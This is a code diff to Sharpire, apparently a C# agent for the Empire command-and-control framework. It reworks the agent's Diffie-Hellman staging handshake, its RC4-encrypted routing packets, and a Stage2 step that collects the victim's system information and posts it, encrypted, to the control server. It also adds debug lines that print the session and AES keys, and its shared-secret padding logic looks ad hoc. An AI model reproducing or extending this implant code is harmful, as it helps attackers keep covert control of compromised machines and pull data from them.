@@ -20,52 +20,129 @@ namespace Sharpire
     public class DiffieHellman
     {
         private BigInteger privateKey;
-        private BigInteger publicKey;
+        public BigInteger publicKey { get; private set; }
         private BigInteger prime;
         private BigInteger generator;
 
         public byte[] PublicKeyBytes { get; private set; }
+        public byte[] PrivateKeyBytes { get; private set; }
+        
         public byte[] AesKey { get; private set; }
 
         public DiffieHellman()
         {
             generator = new BigInteger(2); // Generator value (should match server)
             prime = BigInteger.Parse(
-                "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF",
+                "00"+"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF",
                 System.Globalization.NumberStyles.HexNumber
             );
 
-            privateKey = GenerateRandomBigInteger(256);
+            privateKey = GenerateRandomBigInteger();
+            PrivateKeyBytes = privateKey.ToByteArray();
             publicKey = BigInteger.ModPow(generator, privateKey, prime);
             PublicKeyBytes = publicKey.ToByteArray();
         }
 
+        public static string HexStringFromBytes(byte[] bytes)
+        {
+            var sb = new StringBuilder();
+            foreach (byte b in bytes)
+            {
+                var hex = b.ToString("x2");
+                sb.Append(hex);
+            }
+            return sb.ToString();
+        }
+        
+        public BigInteger BigIntegerFromHexBytes(byte[] bytes)
+        {
+            // Convert byte array to hex string
+            string hexString = BitConverter.ToString(bytes).Replace("-", "");
+
+            // Convert hex string to BigInteger
+            return BigInteger.Parse(hexString, System.Globalization.NumberStyles.HexNumber);
+        }
+        
         public void GenerateSharedSecret(byte[] serverPubKey)
         {
-            BigInteger serverPublicKey = new BigInteger(serverPubKey);
-            Console.WriteLine("Server Public Key: " + serverPublicKey);
-            BigInteger sharedSecret = BigInteger.ModPow(serverPublicKey, privateKey, prime);
+            
+            BigInteger bigIntValue = BigIntegerFromHexBytes(serverPubKey);
+            Console.WriteLine("Server Public Key (int): " + bigIntValue.ToString());
+            
+            // Step 2: Compute Shared Secret
+            BigInteger sharedSecret = BigInteger.ModPow(bigIntValue, privateKey, prime);
 
+            // Convert Shared Secret to Byte Array
+            byte[] rawSharedSecretBytes = sharedSecret.ToByteArray();
+            Array.Reverse(rawSharedSecretBytes);
+
+
+// Ensure positive representation (remove sign bit issues)
+            BigInteger absSharedSecret = BigInteger.Abs(sharedSecret);
+
+// Convert BigInteger to binary string manually
+            string binaryString = string.Join("", absSharedSecret
+                .ToByteArray()
+                .Reverse() // Ensure Big-Endian order
+                .Select(b => Convert.ToString(b, 2).PadLeft(8, '0'))); // Convert each byte to binary
+
+// Trim leading zeros to match Python’s bin(x)[2:]
+            binaryString = binaryString.TrimStart('0');
+
+// Compute actual bit length
+            int bitLength = binaryString.Length + 2;
+
+            Console.WriteLine("Binary Representation Length: " + bitLength);
+            
+            int expectedLength = (bitLength + 1); 
+            
+            Console.WriteLine("Expected Length: " + expectedLength);
+            if (rawSharedSecretBytes.Length > expectedLength)
+            {
+                rawSharedSecretBytes = rawSharedSecretBytes.Skip(rawSharedSecretBytes.Length - expectedLength).ToArray();
+            }
+
+            // Create a zero-padded byte array with correct length
+            byte[] sharedSecretBytes = new byte[expectedLength];
+
+            // Copy **from the end** of `rawSharedSecretBytes` to **the end** of `sharedSecretBytes`
+            Array.Copy(rawSharedSecretBytes, 0, sharedSecretBytes, expectedLength - rawSharedSecretBytes.Length, rawSharedSecretBytes.Length);
+
+            // Ensure Big-Endian Format (Reverse Bytes)
+            //Array.Reverse(sharedSecretBytes);
+
+            // Debug Output
+            //Console.WriteLine("Shared Secret Big Int: " + BigIntegerFromHexBytes(sharedSecretBytes).ToString());
+            //Console.WriteLine("Shared Secret (Big-Endian Hex): " + BitConverter.ToString(sharedSecretBytes).Replace("-", ""));
+
+            // Compute SHA-256 Hash for AES Key
             using (SHA256 sha256 = SHA256.Create())
             {
-                AesKey = sha256.ComputeHash(sharedSecret.ToByteArray());
+                AesKey = sha256.ComputeHash(sharedSecretBytes);
             }
-        }
 
-        private static BigInteger GenerateRandomBigInteger(int bits)
+            Console.WriteLine("AES Key (SHA-256): " + BitConverter.ToString(AesKey).Replace("-", ""));
+        }
+        
+        private static BigInteger GenerateRandomBigInteger()
         {
-            byte[] bytes = new byte[bits / 8];
+            byte[] bytes = new byte[540]; // Adjust size as needed
+
             using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
             {
                 rng.GetBytes(bytes);
             }
 
-            bytes[bytes.Length - 1] &= 0x7F; // Ensure the highest bit is 0 to make it positive
+            // Ensure the highest bit is 0 (prevent negative numbers)
+            bytes[bytes.Length - 1] &= 0x7F;
+
+            // Convert to BigInteger
             BigInteger randomInt = new BigInteger(bytes);
 
+            // If the number is zero, regenerate
             if (randomInt == 0)
             {
-                return GenerateRandomBigInteger(bits); // Regenerate if zero
+                return GenerateRandomBigInteger();
             }
 
             return randomInt;
@@ -191,9 +268,6 @@ namespace Sharpire
             {
                 if ((int)((HttpWebResponse)webError.Response).StatusCode == 500)
                 {
-#if (PRINT)
-                    Console.WriteLine("Stage1 Failure");
-#endif
                     GC.Collect();
                    // Execute();
                 }
@@ -204,9 +278,6 @@ namespace Sharpire
             }
             catch (Exception error)
             {
-#if (PRINT)
-                Console.WriteLine("Stage1 Failure");
-#endif
                 Console.WriteLine(error.ToString());
             }
             finally
@@ -217,7 +288,7 @@ namespace Sharpire
             }
         }
 
-        private byte[] BuildRoutingPacket(byte[] key, string sessionId, int meta, byte[] encryptedBytes)
+        public static byte[] BuildRoutingPacket(byte[] key, string sessionId, int meta, byte[] encryptedBytes)
         {
             int encryptedBytesLength = (encryptedBytes != null) ? encryptedBytes.Length : 0;
 
@@ -228,7 +299,7 @@ namespace Sharpire
 
             byte[] initializationVector = NewInitializationVector(4);
             byte[] rc4Key = Misc.combine(initializationVector, key);
-            byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);
+            byte[] routingPacketData = rc4Encrypt(rc4Key, data);
 
             routingPacketData = Misc.combine(initializationVector, routingPacketData);
             if (encryptedBytes != null)
@@ -238,7 +309,45 @@ namespace Sharpire
 
             return routingPacketData;
         }
+        
+        public static string HexStringFromBytes(byte[] bytes)
+        {
+            var sb = new StringBuilder();
+            foreach (byte b in bytes)
+            {
+                var hex = b.ToString("x2");
+                sb.Append(hex);
+            }
+            return sb.ToString();
+        }
+        
+        public static string Utf8StringToHex(string utf8Str)
+        {
+            // Step 1: Convert UTF-8 string (which is numeric) directly to a BigInteger
+            BigInteger intValue = BigInteger.Parse(utf8Str);
 
+            // Step 2: Convert the integer to hexadecimal
+            string hexString = intValue.ToString("X"); // Uppercase Hex
+
+            return hexString;
+        }
+
+
+        public static byte[] HexStringToByteArray(string hexString)
+        {
+            if (hexString.Length % 2 != 0)
+                hexString = "0" + hexString; // Ensure even length
+
+            int byteCount = hexString.Length / 2;
+            byte[] bytes = new byte[byteCount];
+
+            for (int i = 0; i < byteCount; i++)
+            {
+                bytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
+            }
+
+            return bytes;
+        }
 
         ////////////////////////////////////////////////////////////////////////////////
         //
@@ -246,19 +355,17 @@ namespace Sharpire
         private byte[] Stage1()
         {
             DiffieHellman dh = new DiffieHellman(); // Step 1: Create DH key pair
-            byte[] publicKey = dh.PublicKeyBytes;
-
-            if (publicKey[publicKey.Length - 1] == 0)
-            {
-                // Remove leading sign byte if present
-                publicKey = publicKey.Take(publicKey.Length - 1).ToArray();
-            }
+            byte[] publicKeyBytes = dh.PublicKeyBytes;
+            BigInteger publicKey = dh.publicKey;
             
+            //string hex = HexStringFromBytes(publicKey);
+            //Console.WriteLine("Client Public Key (Hex): " + hex);
             
-            Array.Reverse(publicKey);
+            //BigInteger bigIntValue = dh.BigIntegerFromHexBytes(publicKey);
+            Console.WriteLine("Client Public Key (int): " + publicKey.ToString());
             
             // Encrypt public key using AES-HMAC
-            byte[] hmacData = AesEncryptThenHmac(stagingKeyBytes, publicKey);
+            byte[] hmacData = AesEncryptThenHmac(stagingKeyBytes, publicKeyBytes);
 
             // Send Routing Packet
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
@@ -271,11 +378,25 @@ namespace Sharpire
 
             // Extract and Generate Shared Secret
             byte[] decryptedData = AesDecryptAndVerify(stagingKeyBytes, packet.EncryptedData);
+            //Array.Reverse(decryptedData);
             byte[] nonce = decryptedData.Take(16).ToArray();
             byte[] serverPubKey = decryptedData.Skip(16).ToArray();
-
-            dh.GenerateSharedSecret(serverPubKey); // Step 2: Compute shared secret
-            sessionInfo.SetSessionKey(Convert.ToBase64String(dh.AesKey)); // Step 3: Store AES key
+            
+            string nonceAscii = Encoding.ASCII.GetString(nonce);
+            Console.WriteLine("Nonce (int): " + nonceAscii);
+            
+            // byte array to big integer
+            //BigInteger serverPublicKey = new BigInteger(serverPubKey);
+            
+            string serverPubKeyAscii = Utf8StringToHex(Encoding.UTF8.GetString(serverPubKey));
+            //string serverPubKeyAscii = Encoding.UTF8.GetString(serverPubKey);
+            Console.WriteLine("Server Public Key (hex): " + serverPubKeyAscii);
+            //BigInteger serverPublicKey = new BigInteger(serverPubKey);
+            //BigInteger serverPublicKey = BigInteger.Parse(Encoding.UTF8.GetBytes(serverPubKey));
+            
+            dh.GenerateSharedSecret(HexStringToByteArray(serverPubKeyAscii)); // Step 2: Compute shared secret
+            sessionInfo.SetSessionKeyBytes(dh.AesKey);
+            //sessionInfo.SetSessionKey(Convert.ToBase64String(dh.AesKey)); // Step 3: Store AES key
 
             return nonce;
         }
@@ -305,7 +426,7 @@ namespace Sharpire
                 Console.WriteLine($"RC4 Key Length: {rc4Key.Length}");
 
                 // ✅ Decrypt the first 20 bytes using RC4
-                byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
+                byte[] routingData = rc4Encrypt(rc4Key, routingEncryptedData);
                 Console.WriteLine($"Decrypted Routing Data Length: {routingData.Length}");
                 Console.WriteLine("Decrypted Routing Data (Hex): " + BitConverter.ToString(routingData.Take(32).ToArray()));
 
@@ -358,8 +479,10 @@ namespace Sharpire
         private byte[] Stage2(byte[] nonce)
         {
             Random random = new Random();
-            byte[] keyBytes = Convert.FromBase64String(sessionInfo.GetSessionKey()); // Retrieve AES key
-
+            byte[] keyBytes = sessionInfo.GetSessionKeyBytes();
+            
+            Console.WriteLine("Session Key: " + BitConverter.ToString(keyBytes));
+            
             // Increment nonce
             long increment = Convert.ToInt64(Encoding.ASCII.GetString(nonce)) + 1;
             string newNonce = increment.ToString();
@@ -367,26 +490,16 @@ namespace Sharpire
             // Encrypt system information with the AES key
             byte[] systemInfoBytes =
                 GetSystemInformation(newNonce + "|", string.Join(",", sessionInfo.GetControlServers()));
-            byte[] iv = new byte[16];
-            random.NextBytes(iv);
-            byte[] encryptedData = aesEncrypt(keyBytes, iv, systemInfoBytes);
-            encryptedData = Misc.combine(iv, encryptedData);
 
-            // Compute HMAC
-            using (HMACSHA256 hmac = new HMACSHA256(keyBytes))
-            {
-                byte[] hmacHash = hmac.ComputeHash(encryptedData).Take(10).ToArray();
-                encryptedData = Misc.combine(encryptedData, hmacHash);
-            }
+            byte[] encryptedData = AesEncryptThenHmac(keyBytes, systemInfoBytes);
 
             // Send encrypted system info
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentID(), 3, encryptedData);
-            string postUri = sessionInfo.GetControlServers().First() + "/index.php";
+            string postUri = "/index.php";
             return SendData(postUri, routingPacket);
         }
 
-
-
+        
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
